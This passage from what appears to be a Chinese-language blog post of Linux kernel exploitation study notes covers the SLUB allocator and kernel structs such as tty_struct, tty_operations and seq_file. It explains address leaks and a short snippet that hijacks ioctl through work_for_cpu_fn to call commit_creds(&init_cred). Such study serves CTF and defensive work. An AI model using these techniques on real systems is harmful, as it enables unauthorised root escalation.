class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="comment">/*  85 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="comment">/*  86 */</span> <span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="comment">/*  87 */</span> <span class="type">slab_flags_t</span> flags;</span><br><span class="line"><span class="comment">/*  88 */</span> <span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line"><span class="comment">/*  89 */</span> <span class="type">unsigned</span> <span class="type">int</span> size;<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="comment">/*  90 */</span> <span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="comment">/*  91 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line"><span class="comment">/*  92 */</span> <span class="type">unsigned</span> <span class="type">int</span> offset;<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="comment">/*  93 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/*  94 */</span> <span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="comment">/*  95 */</span> <span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line"><span class="comment">/*  96 */</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 136 */</span> &#125;;</span><br></pre></td></tr></table></figure><p><img src="/image/learning_linux_kernel_2/1740888683949.png" alt="1740888683949">*</p><h5 id="kmem-cache-cpu-结构体"><a href="#kmem-cache-cpu-结构体" class="headerlink" title="kmem_cache_cpu 结构体"></a>kmem_cache_cpu 结构体</h5><ul><li>对于一个 <code>kmem_cache</code>，每个 <code>CPU</code> 都有与其对应且独立的 <code>kmem_cache_cpu</code></li><li>其中关键成员包括：<ul><li><code>freelist</code>：指向下一个可用对象（<code>object</code>）的指针，其 <code>freelist</code>与slab中的 <code>freelist</code>不同（仅当 <code>slab</code> 对象被挂在 <code>partial</code> 链表中时，其 <code>freelist</code> 才有可能被用到；分配和释放优先考虑 <code>kmem_cache_cpu</code>中的 <code>freelist</code>）</li><li><code>slab</code>：指向当前用以进行内存分配的 <code>slab</code></li><li><code>partial</code>：需要开启编译选项 <code>CONFIG_SLUB_CPU_PARTIAL=y</code>，<code>percpu</code> 的 <code>partial slab</code> 链表，链表上为仍有一定空闲对象的 <code>slab</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; include/linux/slub_def.h:43</span></span><br><span class="line"><span class="comment">/* 43 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="comment">/* 44 */</span> <span class="type">void</span> **freelist;<span class="comment">/* Pointer to next available object */</span></span><br><span class="line"><span class="comment">/* 45 */</span> <span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line"><span class="comment">/* 46 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="comment">/* 47 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* 48 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="comment">/* 49 */</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">-------</span><br><span class="line"><span class="comment">/* 53 */</span> &#125;;</span><br></pre></td></tr></table></figure><h5 id="kmem-cache-node-结构体"><a href="#kmem-cache-node-结构体" class="headerlink" title="kmem_cache_node 结构体"></a>kmem_cache_node 结构体</h5><ul><li>每个节点（即三级结构 <code>节点 -&gt; 区 -&gt; 页</code> 中的节点）对应的后备内存池，当 percpu 的独占内存池耗尽后便会从对应 node 的后备内存池尝试分配</li><li>不同于 <code>kmem_cache_cpu</code> 只有一个 <code>slab</code>，<code>kmem_cache_node</code> 会维护多个 <code>slab</code>，对 <code>kmem_cache_cpu</code> 的 <code>slab</code> 进行分配和回收</li><li>其中关键成员包括：<ul><li><code>partial</code>：同上，包含 <code>partial slab</code></li><li><code>full</code>：不常用，连接没有空闲对象的 <code>slab</code></li></ul></li></ul><h4 id="分配过程"><a href="#分配过程" class="headerlink" title="分配过程"></a>分配过程</h4><ol><li><code>slub allocator</code>从 <code>kmem_cache_cpu</code>上取 <code>object</code>，若 <code>kmem_cache_cpu</code>上存在，则直接返回；</li><li>若不存在，该 <code>slub</code>会被加入到 <code>kmem_cache_node</code>中的 <code>full</code>链表，并从 <code>partial</code>链表中取一个 <code>slub</code>挂载到 <code>kmem_cache_cpu</code>上，然后重复第一步的操作</li><li>若 <code>kmem_cache_cpu</code>的 <code>partial</code>链表也空了，那么会向 <code>buddy system</code>请求分配新的内存页，划分为多个 <code>object</code>，并给到 <code>kmem_cache_cpu</code>，取出 <code>object</code>并返回</li></ol><h4 id="释放过程"><a href="#释放过程" class="headerlink" title="释放过程"></a>释放过程</h4><p>关键于被释放的 <code>object</code>所属的slub位于哪里。</p><p>若其 <code>slub</code>现在位于 <code>kmem_cache_cpu</code>，则直接头插法插入当前 <code>kmem_cache_cpu</code>的 <code>freelist</code>链表。</p><p>若其 <code>slub</code>属于 <code>kmem_cache_node</code>的 <code>partial</code>链表上的 <code>slub</code>，则同样通过头插法插入对应的 <code>slub</code>中的 <code>freelist</code>。</p><p>若其 <code>slub</code>属于 <code>kmem_cache_node</code>的 <code>full</code>链表上的 <code>slub</code>，则会使其成为对应 <code>slub</code>的 <code>freelist</code>的头结点，并将该 <code>slub</code>从 <code>full</code>链表迁移到 <code>partial</code></p><h2 id="常用结构体、函数及利用方法"><a href="#常用结构体、函数及利用方法" class="headerlink" title="常用结构体、函数及利用方法"></a>常用结构体、函数及利用方法</h2><h3 id="tty-设备结构体"><a href="#tty-设备结构体" class="headerlink" title="tty 设备结构体"></a>tty 设备结构体</h3><p>tty 设备在 <code>/dev</code> 下的一个伪终端设备 <code>ptmx</code> 。</p><h4 id="tty-struct（kmalloc-1k-GFP-KERNEL-ACCOUNT）"><a href="#tty-struct（kmalloc-1k-GFP-KERNEL-ACCOUNT）" class="headerlink" title="tty_struct（kmalloc-1k | GFP_KERNEL_ACCOUNT）"></a>tty_struct（kmalloc-1k | GFP_KERNEL_ACCOUNT）</h4><h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>定义于 <code>include/linux/tty.h</code> 中，当我们打开 <code>/dev/ptmx</code> 时（init文件需要挂载 <code>pts</code>）会在内核中分配一个 tty_struct 结构体，起始位置有魔数为 <code>0x5401</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure><h5 id="泄露内核基地址（-text段）"><a href="#泄露内核基地址（-text段）" class="headerlink" title="泄露内核基地址（.text段）"></a>泄露内核基地址（.text段）</h5><p><code>tty_operations</code>会被初始化为全局变量 <code>ptm_unix98_ops</code>或者 <code>pyt_unix98_ops</code> ，开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 <code>tty_operations</code> 地址的低三16进制位来判断是 <code>ptm_unix98_ops</code> 还是 <code>pty_unix98_ops</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms | grep <span class="string">&#x27;ptm_unix98_ops&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="泄露内核堆地址（内核线性映射区）"><a href="#泄露内核堆地址（内核线性映射区）" class="headerlink" title="泄露内核堆地址（内核线性映射区）"></a>泄露内核堆地址（内核线性映射区）</h5><p><code>tty_struct</code>中的 <code>dev</code>与 <code>driver</code>是通过 <code>kmalloc</code>分配的，可以通过这两个成员泄露内核地址。</p><h5 id="劫持内核执行流"><a href="#劫持内核执行流" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h5><p>对这个 <code>tty</code>设备（例如 <code>/dev/ptmx</code>）进行相应操作（如 <code>write</code>、<code>ioctl</code>）时便会执行我们在 <code>tty_operations</code>中布置好的恶意函数指针，从而劫持内核执行流。参数可控， <code>rdi</code>即为 <code>tty_struct</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,<span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,<span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,<span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h4 id="work-for-cpu-fn函数"><a href="#work-for-cpu-fn函数" class="headerlink" title="work_for_cpu_fn函数"></a>work_for_cpu_fn函数</h4><h5 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"> </span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*相当于执行</span></span><br><span class="line"><span class="comment">static void work_for_cpu_fn(size_t * args)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    args[6] = ((size_t (*) (size_t)) (args[4](args[5]));</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><p>可以将 <code>tty_struct</code>劫持为如下形式：（劫持函数表 <code>tty_operations</code>中的 <code>ioctl</code> 为work_for_cpu_fn）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tty_struct[<span class="number">4</span>] = (<span class="type">size_t</span>)commit_creds;</span><br><span class="line">tty_struct[<span class="number">5</span>] = (<span class="type">size_t</span>)init_cred;</span><br><span class="line"></span><br><span class="line">ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"><span class="comment">/*相当于执行</span></span><br><span class="line"><span class="comment">((void*)tty_struct[4])(tty_struct[5]);</span></span><br><span class="line"><span class="comment">commit_creds(&amp;init_cred);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="tty-file-private-kmalloc-32-GFP-KERNEL"><a href="#tty-file-private-kmalloc-32-GFP-KERNEL" class="headerlink" title="tty_file_private (kmalloc-32 | GFP_KERNEL)"></a>tty_file_private (kmalloc-32 | GFP_KERNEL)</h4><h5 id="定义：-2"><a href="#定义：-2" class="headerlink" title="定义："></a>定义：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct tty_file_private &#123;</span><br><span class="line">    struct tty_struct *tty;</span><br><span class="line">    struct file *file;</span><br><span class="line">    struct list_head list;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>打开 <code>/dev/ptmx</code> 时会分配 <code>tty_file_private</code> 并且该结构体的 <code>tty</code> 指针会指向 <code>tty_struct</code> 。（UAF用于泄露地址）</p><p>相应的，当关闭打开的 <code>/dev/ptmx</code> 时会释放相应结构。</p><h3 id="seq-file-相关"><a href="#seq-file-相关" class="headerlink" title="seq_file 相关"></a>seq_file 相关</h3><h4 id="seq-operation-kmalloc-32-GFP-KERNEL-ACCOUNT"><a href="#seq-operation-kmalloc-32-GFP-KERNEL-ACCOUNT" class="headerlink" title="seq_operation(kmalloc-32 | GFP_KERNEL_ACCOUNT)"></a>seq_operation(kmalloc-32 | GFP_KERNEL_ACCOUNT)</h4><h5 id="定义：-3"><a href="#定义：-3" class="headerlink" title="定义："></a>定义：</h5><ul><li><p>为了简化操作，在内核 <code>seq_file</code> 系列接口中为 <code>file</code> 结构体提供了 <code>private data</code> 成员 <code>seq_file</code> 结构体(无法打开来申请内存空间)。</p></li><li><p>通过 <code>open(&quot;/proc/self/stat&quot;, O_RDONLY)</code>来打开，从而申请 <code>seq_operation</code>这个结构体。</p><ul><li><pre><code class="language-c">stat_open()        &lt;--- stat_proc_ops.proc_open    single_open_size()        single_open() //可以分配seq_operations 结构体<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">* 该结构体定义于 `/include/linux/seq_file.h` 当中。</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">struct seq_file &#123;</span><br><span class="line">    char *buf;</span><br><span class="line">    size_t size;</span><br><span class="line">    size_t from;</span><br><span class="line">    size_t count;</span><br><span class="line">    size_t pad_until;</span><br><span class="line">    loff_t index;</span><br><span class="line">    loff_t read_pos;</span><br><span class="line">    struct mutex lock;</span><br><span class="line">    const struct seq_operations *op;</span><br><span class="line">    int poll_event;</span><br><span class="line">    const struct file *file;</span><br><span class="line">    void *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file 